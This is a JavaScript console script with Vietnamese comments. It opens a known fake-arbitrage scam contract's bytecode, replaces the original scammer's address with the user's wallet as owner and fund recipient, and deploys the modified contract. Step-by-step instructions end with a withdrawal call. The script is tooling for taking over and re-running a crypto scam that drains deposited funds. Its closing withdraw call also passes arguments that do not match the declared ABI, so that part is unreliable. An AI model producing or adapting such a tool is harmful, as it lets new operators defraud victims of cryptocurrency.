// Bytecode Scam Editor - Công cụ chỉnh sửa bytecode
const SCAMMER='0xAE42745419e4c54b05CD4B4bF069a891dDe5c21';
const SCAM_ABI=[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"TARGET_ADDRESS","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"executeArbitrage","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];

function findAddrs(bc){const h=bc.startsWith('0x')?bc.slice(2):bc;const re=/73([0-9a-fA-F]{40})/g;const f=[];let m;while((m=re.exec(h))!==null){const a='0x'+m[1];if(!f.find(x=>x.toLowerCase()===a.toLowerCase()))f.push(a)}return f}

function replaceAddr(bc,old,neu){let h=bc.startsWith('0x')?bc.slice(2):bc;const o=old.replace('0x','').toLowerCase();const n=neu.replace('0x','').toLowerCase();if(o.length!==40||n.length!==40)throw Error('Addr phải 40 hex chars');const c=(h.toLowerCase().match(new RegExp(o,'g'))||[]).length;if(!c)throw Error('Không tìm thấy: '+old);h=h.replace(new RegExp(o,'gi'),n);return{bc:'0x'+h,count:c}}

// Phân tích bytecode - hiển thị địa chỉ
function analyze(bc){console.log('=== PHÂN TÍCH ===');const addrs=findAddrs(bc);console.log('Tìm thấy',addrs.length,'địa chỉ:');addrs.forEach((a,i)=>console.log(`  [${i+1}] ${a} ${a.toLowerCase()===SCAMMER.toLowerCase()?'⚠️ SCAMMER':''}`));return addrs}

// Thay đổi owner + target address
function customize(bc,newOwner,newTarget){
  newTarget=newTarget||newOwner;
  console.log('\n=== CHỈNH SỬA ===');
  console.log('Scammer:',SCAMMER);
  console.log('Owner mới:',newOwner);
  console.log('Target mới:',newTarget);
  let r=replaceAddr(bc,SCAMMER,newOwner);
  console.log('Đã thay:',r.count,'chỗ');
  if(newTarget.toLowerCase()!==newOwner.toLowerCase()){const r2=replaceAddr(r.bc,newOwner,newTarget);r.bc=r2.bc;console.log('Thay target:',r2.count,'chỗ')}
  console.log('✅ Bytecode mới sẵn sàng');
  return r.bc
}

// Deploy bytecode đã chỉnh sửa
async function deployCustom(bc,abi){
  const provider=new ethers.BrowserProvider(window.ethereum);
  const signer=await provider.getSigner();
  const factory=new ethers.ContractFactory(abi||SCAM_ABI,bc,signer);
  const c=await factory.deploy();
  await c.waitForDeployment();
  const addr=await c.getAddress();
  console.log('Contract:',addr);
  console.log('Owner:',await c.owner());
  console.log('Target:',await c.TARGET_ADDRESS());
  return c
}

/*
HƯỚNG DẪN:

1. Copy bytecode scam từ original.html dòng 5061
2. Mở Console (F12), paste code này vào
3. Chạy:

// Phân tích
analyze(scamBytecode);

// Thay đổi - ĐIỀN ĐỊA CHỈ CỦA BẠN
const newBC = customize(
  scamBytecode,
  '0x1234...abcd',  // Owner mới (ví bạn)
  '0x1234...abcd'   // Target mới (nhận tiền)
);

// Deploy
const contract = await deployCustom(newBC);

// Rút tiền (sau khi có ETH trong contract)
await contract.withdraw('0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', '0x1234...abcd', ethers.parseEther('1'));
*/